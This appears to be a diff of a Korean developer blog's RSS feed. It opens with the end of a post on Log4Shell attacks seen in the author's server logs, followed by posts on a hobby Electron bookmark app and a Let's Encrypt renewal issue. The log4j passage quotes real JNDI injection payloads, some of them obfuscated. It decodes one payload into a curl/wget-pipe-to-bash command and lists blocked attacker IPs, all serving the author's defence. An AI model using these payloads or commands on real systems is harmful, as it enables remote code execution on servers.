+51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] &quot;GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0&quot; 404 162 &quot;-&quot; &quot;mozila&quot;
+45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] &quot;GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1&quot; 404 134 &quot;${jndi:dns://45.83.64.1/securityscan-http80&quot; &quot;${jndi:dns://45.83.64.1/securityscan-http80&quot;
+45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] &quot;GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1&quot; 302 0 &quot;${jndi:dns://45.83.64.1/securityscan-https443&quot; &quot;${jndi:dns://45.83.64.1/securityscan-https443&quot;
+45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] &quot;GET / HTTP/1.1&quot; 200 7587 &quot;${jndi:dns://45.83.64.1/securityscan-https443&quot; &quot;${jndi:dns://45.83.64.1/securityscan-https443&quot;
+195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] &quot;GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo HTTP/1.1&quot; 200 396 &quot;${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo&quot; &quot;${${::-j${::-n${::-d${::-i:${::-l${::-d${::-a${::-p://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo&quot;
+167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClas&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;저기서 base64로 인코딩된 부분을 풀어보니&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;(curl -s 195.54.160.149:5874/3.36.159.204:80||wget -q -O- 195.54.160.149:5874/3.36.159.204:80)|bash&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;참고 url 중에 차단 권고에 나온 시도가 많았다.&lt;br&gt;
+조기에 발견해서 다행인거 같고…정말 침입시도가 무수했다…&lt;br&gt;
+모두 대응 처리를 해뒀다.&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;부록---래브라도&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%B6%80%EB%A1%9D---%EB%9E%98%EB%B8%8C%EB%9D%BC%EB%8F%84&quot; aria-label=&quot;부록   래브라도 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;부록 - 래브라도&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://labrador.iotcube.com&quot;&gt;래브라도&lt;/a&gt; 에서 log4j 취약점 점검 도구를 제공하고 있다.&lt;br&gt;
+그런데 난 사용해도 이상하게 검출이 안되었다;;&lt;/p&gt;
+&lt;p&gt;사용법은 저기 나와있겠지만…&lt;br&gt;
+프로젝트 디렉토리를 난 해당 프로젝트의 root 디렉토리로 잡아보고, jar 파일만 있는 곳에서도 해봤는데 검출 결과가 0이었다.&lt;br&gt;
+그 때 2.11 사용했었는데…&lt;br&gt;
+아마 user agent를 다른 방식으로 기록해서 그런가…&lt;br&gt;
+무튼 정 찝찝하면 한번 돌려보는 것도 좋은 방법일듯…&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;부록---ip-처리&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%B6%80%EB%A1%9D---ip-%EC%B2%98%EB%A6%AC&quot; aria-label=&quot;부록   ip 처리 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;부록 - IP 처리&lt;/h3&gt;
+&lt;p&gt;LG CNS와 talos 글에 나온 ip를 차단하였다.&lt;br&gt;
+난 저 아이피에 class 대역 차단으로 더 막아뒀다.&lt;/p&gt;
+&lt;p&gt;171.25.193.0/24&lt;br&gt;
+185.220.0.0/16&lt;/p&gt;
+&lt;p&gt;이 두놈이 좀 많았다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;109.237.96.124 1; #log4j attacker
+        185.100.87.202 1;
+        213.164.204.146 1;
+        185.220.101.146 1;
+        171.25.193.20 1;
+        178.17.171.102 1;
+        45.155.205.233 1;
+        171.25.193.25 1;
+        171.25.193.77 1;
+        171.25.193.78 1;
+        182.220.100.242 1;
+        185.220.101.39 1;
+        18.27.197.252 1;
+        89.234.182.139 1;
+        104.244.79.6 1;
+        80.71.158.12 1;
+        45.137.155.55 1;
+        89.249.63.3 1;
+        61.19.25.207 1;
+        195.251.41.139 1;
+        131.100.148.7 1;
+        46.105.95.220 1;
+        170.210.45.163 1;
+        5.157.38.50 1;
+        114.112.161.155 1;
+        221.228.87.37 1;
+        191.232.38.25 1;
+        164.52.53.163 1;
+        45.130.229.168 1;
+        133.130.120.176 1;
+        152.89.239.12 1;
+        163.172.157.143 1;
+        205.185.115.217 1; #log4 attacker&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[21년 12월 7일 연구일지 (with SML (Save My Link) 그냥 즐겨찾기 프로그램 만든 후기)]]></title><description><![CDATA[개발을 하다보면 쌓이는 링크들… 개발을 하다보면 개발자의 성지 stackoverflow…]]></description><link>https://elfinlas.github.io/til/211207_devnote/</link><guid isPermaLink="false">https://elfinlas.github.io/til/211207_devnote/</guid><pubDate>Tue, 07 Dec 2021 17:48:03 GMT</pubDate><content:encoded>&lt;h2 id=&quot;개발을-하다보면-쌓이는-링크들&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B0%9C%EB%B0%9C%EC%9D%84-%ED%95%98%EB%8B%A4%EB%B3%B4%EB%A9%B4-%EC%8C%93%EC%9D%B4%EB%8A%94-%EB%A7%81%ED%81%AC%EB%93%A4&quot; aria-label=&quot;개발을 하다보면 쌓이는 링크들 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;개발을 하다보면 쌓이는 링크들…&lt;/h2&gt;
+&lt;p&gt;개발을 하다보면 개발자의 성지 stackoverflow나 다른 사람의 기술 블로그를 많이 보게 된다.&lt;br&gt;
+그리고 유용한 것은 즐겨찾기에 저장하거나 페이지 탭에 그대로 두게 된다.&lt;/p&gt;
+&lt;p&gt;문제는…&lt;br&gt;
+브라우저에서 제공하는 즐겨찾기는 몹시 불편하다.&lt;br&gt;
+제한적인 카테고리에 일정 수가 넘어가면 찾는데 어려움의 문제가 기다린다.&lt;/p&gt;
+&lt;p&gt;두 번째로 페이지에 그냥 두면…&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 9.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAjUlEQVQI1xWKywqCQAAA/f+/Kcq0x6F7aVYrWGlp5CHwsQ93oQ6THYZhYDwxOXOZplz9lPsqIwsE+VJQrQVleBxJKOb70QcKf0cZRBRhRLUVPDcnHuOTLWLyRcJtFuNp22MGTack9vOlbh2tchjnUNYhtUFJRas15aum6Xtq2dPZAWMtjVK8h/EZ/m34AWm8kKjfyV/MAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 01&quot;
+        title=&quot;img 01&quot;
+        src=&quot;/static/901355c67863511d19ef88a491fc8022/c1b63/img_01.png&quot;
+        srcset=&quot;/static/901355c67863511d19ef88a491fc8022/5a46d/img_01.png 300w,
+/static/901355c67863511d19ef88a491fc8022/0a47e/img_01.png 600w,
+/static/901355c67863511d19ef88a491fc8022/c1b63/img_01.png 1200w,
+/static/901355c67863511d19ef88a491fc8022/d61c2/img_01.png 1800w,
+/static/901355c67863511d19ef88a491fc8022/97a96/img_01.png 2400w,
+/static/901355c67863511d19ef88a491fc8022/93ba6/img_01.png 2874w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;이런 대 참사가 발생한다.&lt;/p&gt;
+&lt;p&gt;그래서 이번에 노드 공부하다가 빠져버린 일렉트론으로 직접 개발해보기로 했다.&lt;br&gt;
+일단 1차 개발용 버전은 아래와 같다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 43.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAABuUlEQVQoz21S2W7cMBDz/39Wj5c+9ArSJC0aoPXuZleyrcs6LZmllTx2DELnUOSMBy0cVhmJAD95RBOQiGwj3Gxwfh7x6/4Jp99/4SbT94/zpH1HVAeYOwc4rgf8J3Z+R5StQEiJRak+5pL7visk2DJUPO4kJmi04ImAwRiLdfXw3kNzbh3ngYo9VaQEt67Q1iKUhJg3xJixaIV5WXgWYYyBswrBOgTmD8fL0zRDUYWindOU8bJk3FRGqQ1iPOP9p4/4+vyI6he0zSPwMTlNzNGIwdLyC5JdqXbDoLWhwhXOObi4QToQO3x6s60dfjw9YHr4hjx+gI0CYQNzWPs1oLWE3d3Q+MgRwzieIOWEeZ7hSajDDkP4TMJ9h+Lw/SyQ1RdIccLdnCAP635lmUhYC/Zk0XLplR+WRXXpGxuQ+LKwtGl3qm39QssSl+UnrL7nQnUVtRQY1tW5FbUmqptRQ3olPJri3+QGqrqaHTfCxlfL11RwYaPIjNoqGrdL2WA7ITtbqdJeUDnvhLeboN0FmR1d+Qf8mXaM8w5hWieU1yvefb7DtaCX4Iij+0IINmamMxKyhpX1PE7/AasitRLMywYFAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 02&quot;
+        title=&quot;img 02&quot;
+        src=&quot;/static/6711758f70b52a3caf131fa9039bed03/c1b63/img_02.png&quot;
+        srcset=&quot;/static/6711758f70b52a3caf131fa9039bed03/5a46d/img_02.png 300w,
+/static/6711758f70b52a3caf131fa9039bed03/0a47e/img_02.png 600w,
+/static/6711758f70b52a3caf131fa9039bed03/c1b63/img_02.png 1200w,
+/static/6711758f70b52a3caf131fa9039bed03/d61c2/img_02.png 1800w,
+/static/6711758f70b52a3caf131fa9039bed03/97a96/img_02.png 2400w,
+/static/6711758f70b52a3caf131fa9039bed03/3b2f8/img_02.png 2790w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;이거 개발하면서 JS의 await / async 에 대해서 좀 어느정도 배우게 되었다.&lt;br&gt;
+나름 학습 효과가 있었던 미니 프로젝트였다.&lt;/p&gt;
+&lt;p&gt;개발시간은… &lt;a href=&quot;https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61&quot;&gt;&lt;img src=&quot;https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61.svg&quot; alt=&quot;wakatime&quot;&gt;&lt;/a&gt; 이 정도?&lt;/p&gt;
+&lt;p&gt;근데 저거 벳지 클릭하면 404 나온다…&lt;br&gt;
+처음 써봤는데 신기하다 ㅎㅎ&lt;br&gt;
+오늘 기준으로 일주일 동안은 11시간을 쏟았군…&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 55.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB9klEQVQoz21S227TQBDNr/HMV/AdCAnxwAtfgXii76hEokKIixAVLURqSwkkIUoT24mvsdfr2V0fZnYTQgUjHWc8npw5Z3cGmgw2lUZeCzqfa7IAevT9AY5h3W0YInz+NsHwMkZctnDWYNBqjfliidl8gcUyQrxOkeZbZKVCUdbIshR5XqAuC3R1ha7KYFSFP+EIvQsCJAbWOS44OAYn0uFzYyysDZD6vLT4tGRFEWGUGJzHBmeML4nFaG1xGhmslWNC69C2rZ8SVQaTlDyJc4HMCCEPmRQW7xaEr0z27ELjLeenK4MPN4SPPEjeo5oJjTGe8KbkaSvCOX/8lRuv8oBgR57zymE4I1bT438x6NlOXjX4HtX4GdeYJA3GsUJUKGybFkWt0GpiNotV2eHVROH9XOFkqvAj1VxmQR1Bd8HZwCsQi5aCCskNQZTvsT9LokAsRyA3bLiPKPTKr3D5S9n7UZsVmrbGJs39Gf4d/c5h2vClrBp0agvNG/KPZcuSJdr0Da6O7iKePoZucqi283+Qqf2OLWOyhy+neDSc4flZ7FV0FBzs95UtB8Jt8hTZ9R2sx/eQpKyUz89bFIM7wuu4wf0XU7we53hwPPU1kvXauxSF4l/6qStQJUdQ1Whn0d26aVkvUXR8ucaTkxk222A3ODj0/QbY70x7M6LbWAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 03&quot;
+        title=&quot;img 03&quot;
+        src=&quot;/static/827096ef9a542daaae3d1da9afe654b1/c1b63/img_03.png&quot;
+        srcset=&quot;/static/827096ef9a542daaae3d1da9afe654b1/5a46d/img_03.png 300w,
+/static/827096ef9a542daaae3d1da9afe654b1/0a47e/img_03.png 600w,
+/static/827096ef9a542daaae3d1da9afe654b1/c1b63/img_03.png 1200w,
+/static/827096ef9a542daaae3d1da9afe654b1/d61c2/img_03.png 1800w,
+/static/827096ef9a542daaae3d1da9afe654b1/a5262/img_03.png 2388w&quot;
+        sizes=&quot;(max-width: 1200px) 100vw, 1200px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;솔직히 이야기 하면…&lt;br&gt;
+낮에 윈도 피시에서 주식창 띄우고 거래 보다가 개발하고…&lt;br&gt;
+밤에는 유튜브랑 넷플릭스 보면서 하고…&lt;br&gt;
+좀 더 집중했으면 더 빨리 만들 수 있었지 않을까…(유튭 스타 홍구랑 넷플 지옥, 아케인, 등등…너무 재미있어서 포기 못하겠다…)&lt;/p&gt;
+&lt;p&gt;무튼 1차는 개인용으로 쓸만하다.
+이걸 좀 UI로 이쁘게 꾸며보고 조금 더 사용성을 높여서 배포해봐야겠다.&lt;/p&gt;
+&lt;p&gt;이름은 뭐로 할까 하다가…할거 없어서 &lt;strong&gt;SML (Save My Link)&lt;/strong&gt; 로 지었다.&lt;br&gt;
+Github에 공개 레포는 팠는데…&lt;br&gt;
+아직 코드는 업뎃 안했다…&lt;br&gt;
+ㄹㅇ 발로짠 코드 + JS 뉴비 스타일 이라서 손 볼게 좀 많다…&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1140px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 102.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAABYlAAAWJQFJUiTwAAABi0lEQVQ4y5WVi66CQAxE/f8fNAgK+EJBfGsUhZrTmxJCzLVssllBOUxnuuuoaRr5b3YH18/ns73/7fejX0BmXdctbDwey/V6be8NAjLu97us12vZbDZSlqWcz2eZz+dSFMVX6E/g4/GQ7XYrSZJInudyPB4ljMIW2LXDVTKjqqpW1el0kul0qtcozrJM9vt9C3UB8W6xWMhut1OFwFCLDf2QXEBWygZwOBy0/DRN1U/m5XJRrwcBKY+SUbhcLvUFlI9qJlA38PV6ackoJKTZbKYlo5aJh6yE5A6FMlHIg6vVSqIo0nBYJ5OJthbDrRDPDEiyqCScIAgUihWDgJYsIVA+ivDSWgkr3MD3+61APEQJpQIjqH5zu/YyAyUWBB7iG0opl5fdbjefQgOihlaxtsFHQHEcq2K+H9zYBgSSJLEGZUA8dbeNASkbJTxsKYdhqECa2x0KK/4BxUOA9CUeAgZKYL5Q5G/lATtZgNl+5r5tSXcoTDY/SXK60Hd85uSmRwe3Tf+/pT+6J/cHjYNeVTYubIgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img 04&quot;
+        title=&quot;img 04&quot;
+        src=&quot;/static/9ed3676918ac1e974bfac15a108c7461/b5cea/img_04.png&quot;
+        srcset=&quot;/static/9ed3676918ac1e974bfac15a108c7461/5a46d/img_04.png 300w,
+/static/9ed3676918ac1e974bfac15a108c7461/0a47e/img_04.png 600w,
+/static/9ed3676918ac1e974bfac15a108c7461/b5cea/img_04.png 1140w&quot;
+        sizes=&quot;(max-width: 1140px) 100vw, 1140px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;보이는가…main.js에서만 작업한 흔적이…&lt;/p&gt;
+&lt;p&gt;일단 이거는 그냥 취미로 만든거라서 편의 기능 위주만 추가할 예정이고, 일렉트론에 대한 부분은 업데이트 안할 예정이다.&lt;br&gt;
+그리고 일렉트론으로 좀 해본 결과 이것도 공부하려면 시간이 걸리고 귀찮아서 더 이상 일렉트론에 학습 시간을 투자하는 행위는 안하려 한다…&lt;/p&gt;
+&lt;p&gt;그래서 &lt;strong&gt;일단 잘 돌아가면 끝&lt;/strong&gt; 이라는 마인드로 개발했다.&lt;br&gt;
+사실 최종 목표는 Node.js로 작은 웹 서비스랑 연동 처리하는게 목표라서 일렉트론은 이제 &lt;strong&gt;Bye…&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SML&lt;/strong&gt;에 기술적인 내용이랑 관련 문서는 조만간 정리해서 올릴 예정이다.&lt;br&gt;
+2주전인가 25일날 모빌리티쇼 다녀온거 영상이랑 사진 정리할게 많아서…&lt;/p&gt;
+&lt;p&gt;혹시 21년 모빌리티쇼에 못가셔서 아쉬운 분은 &lt;a href=&quot;https://www.youtube.com/watch?v=iY170ga0SJc&quot;&gt;개인 유튜브&lt;/a&gt;에 올렸으니 관심있으신 분은 ㄱㄱ&lt;/p&gt;
+&lt;p&gt;곧 &lt;strong&gt;SML&lt;/strong&gt; 공식 문서 및 배포 소식으로 돌아올 예정…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Let'sEncrypt 갱신이 불가할 때 (produced an unexpected error The manual plugin is not working)]]></title><description><![CDATA[22.09.25 내용 추가 여기서 진행한 방식의 경우 standalone 방식이다. 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다. 최근 방식의 경우 Webroot나 DNS…]]></description><link>https://elfinlas.github.io/letsencrypt/211105_letscert-fail/</link><guid isPermaLink="false">https://elfinlas.github.io/letsencrypt/211105_letscert-fail/</guid><pubDate>Fri, 05 Nov 2021 18:05:11 GMT</pubDate><content:encoded>&lt;h1 id=&quot;220925-내용-추가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#220925-%EB%82%B4%EC%9A%A9-%EC%B6%94%EA%B0%80&quot; aria-label=&quot;220925 내용 추가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;22.09.25 내용 추가&lt;/h1&gt;
 &lt;p&gt;여기서 진행한 방식의 경우 &lt;strong&gt;standalone&lt;/strong&gt; 방식이다.&lt;br&gt;
 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다.&lt;/p&gt;
 &lt;p&gt;최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다.&lt;br&gt;
@@ -4173,15 +5384,15 @@ parameters [&apos;2017-11-27 14:25:08.67&apos;,&apos;admin@admin.com&apos;,&apos
     &gt;
       &lt;span
     class=&quot;gatsby-resp-image-background-image&quot;
-    style=&quot;padding-bottom: 205.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAApCAYAAAA1bQl+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAIZElEQVRIx22WWWwV1xnH73PVhy5SpbZpFRWwISxpJDCkwVCwCUsgJIGgplQilCVmzQIkAVpIgdJKSfPQJWoq9SFAloduogopu1m82yWJKSb2vbbvMnf2mbvM3NX2v/9v7rUxah/+OjNnZs6cc37f9/9OKLtsAbxnVyLbMB/ZpfPu1xLqh3PZzg2uvXXLK1rbAG/DKvjbfsxvV7BvRdCfbahDKDylFuGaGQh/rwbhKZMk99NmIDJjFsK1D1XemT6TLa+nTg+ehafz2bTqtTznd6G+abMReXw1Pv/S19H71W+h9yvfnFBf7RxEnt6AgeVrMLB0BbUc/Ysa0fvlb+D2174dvHOb34xL7kPhxY2INK5EpL4BEb4cXrgUA1X1L1jEdklF9dX+HyxGf91jwbP+RxffU/DuUoSKnodcKoWUZcE1DPiZDIqUcfglqD9ZC/Wn66FuXgd10zPQtj0H/cUt1FZo25+D+jz7N/P5lg1QN66B+eYxhErlMnL5PBzXhWXb8AsFlHgvHyjL5yP55CIk19Qj+cRjUNcvg751AzQOrq5rDPqSqxcG7yjL5kI/tJczHBtDCcDYyAjGeD3KtsyfFB0bufgw8koc+UQMOSofjyIXHaSG+Cxa6ZPnIt4XXIczjESQ7+2FwWWbXLJBZdJp6LIFWQ8W+23ep7g1JldhcztcXrvZLGwvC40/NlIudA7mZDMIjQwNoXTnDl/y4doOdF2Hyw9lYMs0oakqdE2DwX6RZZiVe2o0U0DRzqLkeChYGRScLEKOn0Uqn0M6TTCZNLL8q8jLefB8D37Ov0/Sn+f7dsbBB7GrOKM04/3kNbZX8dfETYSSSQU2ZxKNRTE0NIgUp18s8s+lYqA8AU2Wn8thpFjGsBFHbcsOfPfGVjx4eQu+c3Mr6tpeQcgkWd1yoZk2LDcNJ5WBzmWZ/IksXwYRSKVSaUIYHUPCVjG/az9mt+7FnEs7Mat9Lxp7fo6QbShIxe7CoVKJfjjxMFzL4Ew5uOMixxnJIAWGU7FYmfFoeQQJR8UjHS+h5uoLmH7xBdRcb8Li7kNccvdZJP/IAP3zRsT+tBF972xCorcFCd1CLJ6AQdo2V6HpGkzLRDwRR9pNIWYqWNT5Ouo69uPR9gOY17kfT3S/gVBCTUDVFCjJOBQlxg+T3AKGz7hsA6ZtTkjuXYbIgDKIdR0nsKb7OJ7q+SVWdx3Dpq43EdL5Z9dxkIjHEaccXssSR0dHMcIgHylXAn1clT1EsOQ5nS9iWtvOYNlT23diYdfrhMIBdCcDzU4zFHwGsQ9NY8wZOlsNvu+jVL4HRMiPjYwibie5zH2Y2bIHsy/vxMy2PWjo/hmhKGGkbl+Gc/sK7NtXYfe1MMBNuFUovp8LgAgcaeUHo6X7ocy40oRpAqXrIELqrU+gntoO/cM9iJ3eg/CZV6EMfYGEZhCAAgkryRpFUWBZAioWQImaCdR3vIa6zgNY0PEq5hLKqq6jCMVUAjEtDClJRJNJqJZsvHUfCMshadcOWsu1guAfSESwvgrl6QkobyEke+VyAJWOofDvLpNd4m0cwGQgk6EojoaHBUoroVzeHkCp7yYUi3ulpwtUHm5uhI6RD2DIMieglP4PFKsKpZVQrlSgLO0+zAGHPoPb8h6c1jPQr5+C9el5xlkqkEDxOKBkh0fLyufyyNC+JJdlhgGUa02YMZ4pPcyUxKcXkfhoH5J/O4SBDw4ifO